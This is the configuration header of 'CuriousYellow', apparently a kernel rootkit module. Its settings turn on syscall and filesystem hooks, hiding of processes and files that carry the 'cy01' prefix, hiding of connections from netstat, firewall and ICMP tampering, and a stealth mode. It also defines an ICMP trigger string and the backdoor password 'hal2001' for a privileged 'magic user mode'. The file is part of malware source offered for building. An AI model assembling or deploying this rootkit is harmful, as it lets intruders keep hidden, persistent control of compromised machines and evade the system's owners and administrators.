/*
 *    CuriousYellow Config File
 *
 *    This lets you specify what parts you want included in your module.
 */

#ifndef _CONFIG_H
#define _CONFIG_H

/* debug output */
#define DEBUG 1

/* file system related syscall replacements */
#define FILE_SYSCALLS 

/* file system ufs lookup replacements */
#undef FILE_UFS

/* process related stuff (kill, fork, procfs and sysctl 'patch') */
#define PROCESS_HACKS

/* hide connections from netstat -an */
#define NETSTAT_HACK

/* network related hacks (icmp_input, firewall rules) */
#define NETWORK_HACKS

/* kernel exec demo */
#define KERNEL_EXEC

/* enable stealth mode */
#undef STEALTH

/* start of the filename of hidden files */
#define MAGICSTRING "cy01"
#define MAGICLENGTH 4

/* icmp trigger string */
#define ICMP_TRIGGER "cy silly test"


/* word to enter magic user mode */
#define MAGICWORD "hal2001"

/********* don't need to change this *************/

/* flags to hide process */
#define P_HIDDEN 0x8000000

/* maximum hidden network connections */
#define MAX_NET 10


#endif /* _CONFIG_H */
